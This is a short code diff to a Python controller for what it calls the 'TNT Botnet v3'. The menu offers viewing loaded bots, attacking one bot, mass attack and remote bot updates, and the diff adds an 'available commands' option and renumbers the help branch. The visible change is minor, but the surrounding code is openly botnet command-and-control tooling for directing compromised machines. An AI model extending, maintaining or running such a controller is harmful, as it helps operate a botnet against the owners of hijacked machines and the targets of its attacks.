@@ -68,7 +68,7 @@ if platform.system() == "Windows":
         "rerun_please": "[*] Rerun program to complete the changes!",
         "mass_shell": "commander@botnet > ",
         "bye": "Thanks for using this tool!",
-        "cmds": "[1] View loaded bots\n[2] Attack one bot\n[3] Mass Attack\n[4] Attach the bot\n[5] Update bot",
+        "cmds": "[1] View loaded bots\n[2] Attack one bot\n[3] Mass Attack\n[4] Attach the bot\n[5] Update bot\n[6] Avaliable commands",
         "Greetings": "Bot Controller For TNT Botnet v3",
         "Answer_from_bot": "[*] Bot sent answer:\n",
         "require_option": "[?] This commandlet requires an option: ",
@@ -189,7 +189,7 @@ try:
             bot = input(cmds["require_option"])
             remote_update(bots_ipv4s_list[int(bot)], packet)
             print(cmds["success"])
-        elif int(com) == 5:
+        elif int(com) == 6:
             print(help_message)
         input("\n\n\nPress enter to continue")
         clear_screen()
